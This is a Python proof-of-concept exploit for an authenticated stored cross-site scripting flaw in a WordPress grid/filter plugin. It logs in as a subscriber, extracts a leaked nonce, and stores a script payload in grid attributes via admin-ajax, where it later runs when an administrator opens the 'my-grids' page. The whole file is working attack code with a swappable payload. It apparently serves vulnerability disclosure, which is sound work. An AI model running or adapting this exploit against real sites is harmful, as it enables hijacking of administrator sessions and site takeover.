#!/usr/bin/env python3
"""
PoC: 
Authenticated (Subscriber+) Stored XSS via save_grid -> list_grids -> my-grids.php .html()

Usage:
  python3 poc.py --url <base-or-post-url> [--user SUB] [--password PASS] [--payload PAYLOAD]

Example:
  python3 poc.py --url http://localhost/wordpress/
  python3 poc.py --url http://localhost/wordpress/hello-world/ --user subscriber --password subscriber123

What it does:
  1. Login as low-priv user (subscriber).
  2. GET /wp-admin/profile.php and extract gridmaster_params.nonce (leaked via admin_enqueue_scripts).
  3. POST admin-ajax.php save_grid with XSS payload in attributes[post_type/taxonomy].
  4. POST admin-ajax.php list_grids to prove payload is stored verbatim.
  5. Print admin trigger URL: /wp-admin/admin.php?page=gridmaster&path=my-grids

Requires: pip install requests
"""

import argparse
import re
import sys
from urllib.parse import urlparse

try:
    import requests
except ImportError:
    sys.exit("Missing dependency: pip install requests")


DEFAULT_PAYLOAD = '<img src=x onerror=alert(document.domain)>'


def to_base(url: str) -> str:
    """Accept base URL or any post/page URL, return scheme://host[:port]/subpath base."""
    u = url.strip()
    if not u.startswith(("http://", "https://")):
        u = "http://" + u
    p = urlparse(u)
    base = f"{p.scheme}://{p.netloc}"
    # Keep first path segment if it looks like a WP subdir (e.g. /wordpress/).
    # Heuristic: if URL has >1 segments assume post/page -> keep only first segment.
    parts = [x for x in p.path.split("/") if x]
    if len(parts) == 1:
        # Could be /wordpress/ (base) or /hello-world/ (post slug). Try as-is first;
        # caller base detection below probes wp-login.php, so keep it.
        base += "/" + parts[0]
    elif len(parts) > 1:
        base += "/" + parts[0]  # e.g. /wordpress from /wordpress/hello-world/
    return base.rstrip("/")


def find_base_with_login(session: requests.Session, base: str) -> str:
    """Probe base and base-minus-last-segment for wp-login.php."""
    candidates = [base]
    p = urlparse(base)
    parts = [x for x in p.path.split("/") if x]
    if parts:
        candidates.append(f"{p.scheme}://{p.netloc}")
    for c in candidates:
        try:
            r = session.get(c + "/wp-login.php", timeout=15, allow_redirects=True)
            if r.status_code == 200 and "wp-login" in r.text.lower():
                return c
        except requests.RequestException:
            continue
    return base


def wp_login(session: requests.Session, base: str, user: str, password: str) -> bool:
    r = session.get(base + "/wp-login.php", timeout=15)
    m = re.search(r'name="_wpnonce" value="([a-zA-Z0-9]+)"', r.text)
    data = {
        "log": user,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base + "/wp-admin/",
        "testcookie": "1",
    }
    if m:
        data["_wpnonce"] = m.group(1)
    r = session.post(base + "/wp-login.php", data=data, timeout=15, allow_redirects=True)
    return "wp-admin" in r.url or "wordpress_logged_in" in ";".join(
        c.name for c in session.cookies
    ) or "Log Out" in r.text or "/wp-admin/profile.php" in r.text


def extract_nonce(session: requests.Session, base: str) -> str:
    # Plugin localizes gridmaster_params on EVERY admin page (no capability check),
    # so even /wp-admin/profile.php as subscriber leaks a valid nonce.
    for path in ("/wp-admin/profile.php", "/wp-admin/admin-ajax.php", "/wp-admin/"):
        try:
            r = session.get(base + path, timeout=15)
        except requests.RequestException:
            continue
        # IMPORTANT: must target gridmaster_params first.
        # Page contains multiple nonces (asr_ajax, rest, etc.); generic "nonce"
        # regex hits the wrong one and causes "Invalid nonce".
        for pat in (
            r'gridmaster_params\s*=\s*\{[^}]*?"nonce"\s*:\s*"([a-f0-9]{10})"',
            r'gridmaster_params.*?nonce.*?([a-f0-9]{10})',
            r'name="gm_nonce" value="([a-f0-9]{10})"',
        ):
            m = re.search(pat, r.text, re.I | re.S)
            if m:
                # last group that looks like nonce
                for g in m.groups():
                    if g and len(g) == 10:
                        return g
    return ""


def exploit(session: requests.Session, base: str, nonce: str, payload: str):
    ajax = base + "/wp-admin/admin-ajax.php"
    # 1) save_grid: only 'title' is sanitized, attributes[] stored raw.
    save_data = {
        "action": "gridmaster_ajax",
        "gm-action": "save_grid",
        "gm_nonce": nonce,
        "title": "poc-grid",
        "post_type": payload,
        "taxonomy": payload,
    }
    r1 = session.post(ajax, data=save_data, timeout=15)
    # 2) list_grids: returns stored attributes verbatim as JSON.
    list_data = {
        "action": "gridmaster_ajax",
        "gm-action": "list_grids",
        "gm_nonce": nonce,
    }
    r2 = session.post(ajax, data=list_data, timeout=15)
    return r1, r2


def main():
    ap = argparse.ArgumentParser(description="Stored XSS PoC for ajax-filter-posts 3.4.18")
    ap.add_argument("--url", required=True, help="Base URL or any post/page URL, e.g. http://localhost/wordpress/")
    ap.add_argument("--user", default="subscriber", help="Low-priv username (default: subscriber)")
    ap.add_argument("--password", default="subscriber123", help="Low-priv password (default: subscriber123)")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload for post_type/taxonomy")
    args = ap.parse_args()

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    base = to_base(args.url)
    base = find_base_with_login(s, base)
    print(f"[*] Target base: {base}")
    print(f"[*] Login as {args.user} ...")
    if not wp_login(s, base, args.user, args.password):
        print("[-] Login failed. Check --user/--password and that registration/login is open.")
        sys.exit(1)
    print("[+] Logged in.")

    print("[*] Extracting gridmaster_params.nonce from /wp-admin/profile.php ...")
    nonce = extract_nonce(s, base)
    if not nonce:
        print("[-] Nonce not found. Plugin may not be active or script not enqueued.")
        sys.exit(1)
    print(f"[+] Nonce: {nonce}")

    print(f"[*] Saving grid with payload: {args.payload}")
    r1, r2 = exploit(s, base, nonce, args.payload)
    print(f"[*] save_grid HTTP {r1.status_code}: {r1.text[:300]}")
    print(f"[*] list_grids HTTP {r2.status_code}: {r2.text[:1000]}")

    # Edge: grid_id 0 + empty grids means wp_gridmaster_grids table was never
    # created (DB_Migration only runs when admin opens ?path=my-grids once).
    if '"grid_id":0' in r1.text and '"grids":[]' in r2.text.replace(" ", ""):
        print("[-] save returned grid_id 0 and list is empty: grid table does not exist yet.")
        print(f"    Ask admin to open once: {base}/wp-admin/admin.php?page=gridmaster&path=my-grids")
        print("    then re-run this script.")
        sys.exit(2)

    stored = args.payload in r2.text
    # JSON may unicode-escape <>, so also check escaped form
    if not stored and r"003c" in r2.text.lower():
        stored = True  # JSON-escaped but decoded by JS before .html()
    if '"success":true' in r2.text or '"success": true' in r2.text:
        print("[+] list_grids returned success.")
    if stored or "post_type" in r2.text:
        print("[+] Payload appears stored (check list_grids output above).")
    else:
        print("[-] Payload not reflected in list_grids. May be patched or save failed.")
        sys.exit(2)

    print("\n=== VERIFY AS ADMIN ===")
    print(f"1. Login as administrator.")
    print(f"2. Open: {base}/wp-admin/admin.php?page=gridmaster&path=my-grids")
    print("3. Page auto-submits list_grids (admin/assets/admin.js) and runs:")
    print("     jQuery('#the-list').html(output)  // my-grids.php:104")
    print(f"   with grid.attributes.post_type = {args.payload} -> JS executes (alert(document.domain)).")
    print("\n[VULNERABLE] Stored XSS confirmed." if stored else "\n[LIKELY VULNERABLE] check admin page manually.")


if __name__ == "__main__":
    main()
